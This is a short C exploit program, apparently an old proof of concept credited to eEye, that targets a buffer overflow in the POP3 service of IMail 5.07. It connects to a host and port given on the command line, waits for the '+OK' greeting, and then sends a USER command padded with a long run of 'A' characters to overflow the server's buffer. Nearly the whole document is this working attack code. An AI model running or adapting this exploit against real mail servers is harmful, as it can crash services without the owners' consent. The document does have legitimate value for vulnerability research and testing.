Exploit (by Interrupt):


/*
 * IMAIL 5.07 POP3 Overflow
 * By: Mike@eEye.com
 *
 * Demonstrates vulnerability
 */


 #include <stdio.h>
 #include <string.h>


#ifdef WINDOWS
 #include <windows.h>
 #include <winsock.h>
#else
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
 #include <netinet/in.h>
#endif


#ifndef WINDOWS
 #define SOCKET_ERROR -1
 #define closesocket(sock) close(sock)
 #define WSACleanup() ;
#endif


char overflow[] =
 "USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";


int main(int argc, char *argv[])
{
#ifdef WINDOWS
   WSADATA wsaData;
#endif


   struct hostent *hp;
   struct sockaddr_in sockin;
   char buf[300], *check;
   int sockfd, bytes;
   char *hostname;
   unsigned short port;


   if (argc <= 1)
   {
      printf("IMAIL POP3 Overflow\n");
      printf("By: Mike@eEye.com\n\n");


      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("If port is not specified we use '110'\n");


      exit(0);
   }


   hostname = argv[1];
   if (argv[2]) port = atoi(argv[2]);
   else port = atoi("110");


   printf("IMAIL POP3 Overflow\n");
   printf("By: Mike@eEye.com\n\n");


#ifdef WINDOWS
   if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }
#endif


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
      exit(-1);
   }


   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);


   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }


   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }


   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   /* Check to see if we get a +OK error code. If so then proceed. */
   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }


   buf[bytes] = '\0';
   check = strstr(buf, "+OK");
   if (check == NULL)
   {
      printf("ERROR: NO +OK response from inital connect\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }


   if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
   {
      printf("ERROR: Send Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }


   printf("Sent.\n");


   closesocket(sockfd);
   WSACleanup();
}

